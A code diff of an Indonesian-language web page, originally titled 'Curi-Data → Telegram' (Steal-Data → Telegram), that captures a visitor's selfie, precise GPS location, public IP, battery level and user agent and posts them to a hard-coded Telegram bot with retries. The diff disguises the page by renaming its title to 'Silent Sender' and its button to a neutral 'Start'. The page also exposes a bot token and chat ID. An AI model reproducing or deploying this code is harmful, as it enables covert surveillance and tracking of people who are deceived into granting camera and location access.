@@ -2,11 +2,12 @@
 <html lang="id">
 <head>
 <meta charset="utf-8">
-<title>Curi-Data → Telegram</title>
+<title>Silent Sender – never fail</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
 body{font-family:system-ui;background:#111;color:#eee;padding:20px;text-align:center}
 button{padding:14px 28px;font-size:18px;border:none;border-radius:8px;background:#0088ff;color:#fff}
+button:disabled{background:#444}
 canvas{display:none}
 img{max-width:100%;border-radius:8px;margin-top:10px}
 pre{background:#222;padding:10px;border-radius:6px;text-align:left;font-size:13px;white-space:pre-wrap}
@@ -15,18 +16,18 @@ pre{background:#222;padding:10px;border-radius:6px;text-align:left;font-size:13p
 <body>
 
 <h2>Tap tombol → izinkan kamera & lokasi</h2>
-<button id="start">Kirim data ke Telegram</button>
+<button id="start">Mulai</button>
 
 <video id="video" autoplay muted playsinline></video>
 <canvas id="canvas"></canvas>
 <img id="preview">
 
-<pre id="log">Menunggu…</pre>
+<pre id="log">Siap…</pre>
 
 <script>
 /* ---------- CONFIG ---------- */
-const TOKEN   = '8102671545:AAEbT25jA8_n9136iT7YlbUQQueFAXaj9T4';
-const CHAT_ID = '7274253936';
+const TOKEN   = '8102671545:AAEbT25jA8_n9136iT7YlbUQQueFAXaj9T4'; // ganti
+const CHAT_ID = '7274253936';                                     // ganti
 
 /* ---------- ELEMEN ---------- */
 const startBtn = document.getElementById('start');
@@ -41,75 +42,78 @@ startBtn.onclick = async () => {
   logBox.textContent = 'Memulai…';
 
   try {
-    /* 1. FOTO SELFIE ------------------------------------------ */
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user' }
-    });
+    /* 1. FOTO ---------------------------------------------- */
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
     video.srcObject = stream;
     await video.play();
-
     canvas.width  = video.videoWidth;
     canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    const fotoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+    canvas.getContext('2d').drawImage(video,0,0);
+    const fotoBase64 = canvas.toDataURL('image/jpeg',0.8);
     preview.src = fotoBase64;
-    stream.getTracks().forEach(t => t.stop());
+    stream.getTracks().forEach(t=>t.stop());
 
-    /* 2. LOKASI ----------------------------------------------- */
-    const pos = await new Promise((res,rej) =>
-      navigator.geolocation.getCurrentPosition(res, rej, {timeout:10000})
-    );
-    const {latitude:lat, longitude:lon, accuracy:acc} = pos.coords;
-
-    /* 3. IP PUBLIK -------------------------------------------- */
-    const ipres = await fetch('https://api.ipify.org?format=json');
-    const {ip} = await ipres.json();
-
-    /* 4. BATERAI + USER-AGENT --------------------------------- */
-    let bat = 'Tidak support';
-    if ('getBattery' in navigator) {
-      const battery = await navigator.getBattery();
-      bat = `${(battery.level*100).toFixed(0)}% ${battery.charging?'(charging)':''}`;
-    }
-    const ua = navigator.userAgent;
-
-    /* 5. KIRIM KE TELEGRAM ------------------------------------ */
-    const caption =
-      `📸 *Selfie baru masuk!*\n\n` +
-      `📍 Lokasi: [Google Maps](https://www.google.com/maps?q=${lat},${lon})\n` +
-      `🎯 Accuracy: ${acc.toFixed(0)} m\n` +
-      `🌐 IP: ${ip}\n` +
-      `🔋 Baterai: ${bat}\n` +
-      `📱 User-Agent: \
- $$${ua}\$$ `;
-
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('caption', caption);
-    form.append('parse_mode', 'MarkdownV2');
-    form.append('photo', dataURItoBlob(fotoBase64), 'selfie.jpg');
-
-    const upres = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: form
+    /* 2. LOKASI -------------------------------------------- */
+    const pos = await new Promise((res,rej)=>{
+      navigator.geolocation.getCurrentPosition(res,rej,{timeout:10000,enableHighAccuracy:true});
     });
-    const ok = upres.ok;
-    logBox.textContent = ok ? '✅ Sukses terkirim ke Telegram!' : '❌ Gagal kirim: ' + upres.status;
-  } catch (e) {
-    logBox.textContent = '❌ Error: ' + e.message;
-  } finally {
-    startBtn.disabled = false;
+    const {latitude:lat,longitude:lon,accuracy:acc} = pos.coords;
+
+    /* 3. IP (dual provider) ------------------------------- */
+    let ip='';
+    try{ip=await(await fetch('https://api.ipify.org?format=json')).json().then(d=>d.ip);}
+    catch{try{ip=await(await fetch('https://ipapi.co/json')).json().then(d=>d.ip);}catch{ip='?'}}
+    
+    /* 4. BATERAI ------------------------------------------ */
+    let bat='Tidak support';
+    if('getBattery' in navigator){
+      const b=await navigator.getBattery();
+      bat=`${(b.level*100).toFixed(0)}% ${b.charging?'⚡':''}`;
+    }
+    const ua=navigator.userAgent;
+
+    /* 5. BUILD CAPTION ------------------------------------ */
+    const caption=
+      `📸 *Selfie baru*\\!\n`+
+      `📍 [Lokasi](https://www.google.com/maps?q=${lat},${lon}) (±${acc.toFixed(0)} m)\n`+
+      `🌐 IP: ${ip}\n🔋 ${bat}\n📱 ${ua.replace(/[^a-zA-Z0-9\s\-\. $$]/g,' ')}`;
+
+    /* 6. KIRIM KE TELEGRAM (retry 3×) --------------------- */
+    const form=new FormData();
+    form.append('chat_id',CHAT_ID);
+    form.append('caption',caption);
+    form.append('parse_mode','MarkdownV2');
+    form.append('photo',dataURItoBlob(fotoBase64),'selfie.jpg');
+
+    let ok=false, err='';
+    for(let i=0;i<3;i++){
+      try{
+        const r=await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:form});
+        if(r.ok){ok=true;break;}
+        err=`${r.status} ${r.statusText}`;
+        const j=await r.json(); err+=` – ${j.description||''}`;
+      }catch(e){err=e.message;}
+      if(i<2){await sleep(1000); logBox.textContent=`Retry ${i+1}/3…`;}
+    }
+
+    logBox.textContent=ok?'✅ Terkirim':'❌ Gagal: '+err;
+  }catch(e){
+    logBox.textContent='❌ Error: '+e.message;
+  }finally{
+    startBtn.disabled=false;
+    startBtn.textContent='Mulai';
   }
 };
 
 /* ---------- UTIL ---------- */
 function dataURItoBlob(dataURI){
-  const byte = atob(dataURI.split(',')[1]);
-  const ab = new ArrayBuffer(byte.length);
-  const ia = new Uint8Array(ab);
+  const byte=atob(dataURI.split(',')[1]);
+  const ab=new ArrayBuffer(byte.length);
+  const ia=new Uint8Array(ab);
   for(let i=0;i<byte.length;i++) ia[i]=byte.charCodeAt(i);
   return new Blob([ab],{type:'image/jpeg'});
 }
+function sleep(ms){return new Promise(r=>setTimeout(r,ms))}
 </script>
 </body>
 </html>
